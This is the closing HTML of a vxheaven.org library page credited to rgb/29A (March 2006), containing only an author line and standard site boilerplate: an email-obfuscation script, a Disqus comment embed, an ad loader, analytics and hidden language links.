<div align="right"><em>rgb/29A mar 2006<br/><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="80e9e1eddff2e7e2c0e8eff4ede1e9ecaee3efed">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></em></div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrg06">de</a><a href="/lib/index.php?lang=en&amp;id=vrg06">en</a><a href="/lib/index.php?lang=es&amp;id=vrg06">es</a><a href="/lib/index.php?lang=it&amp;id=vrg06">it</a><a href="/lib/index.php?lang=fr&amp;id=vrg06">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrg06">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrg06">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrg06">ua</a></div>
</body>
</html>
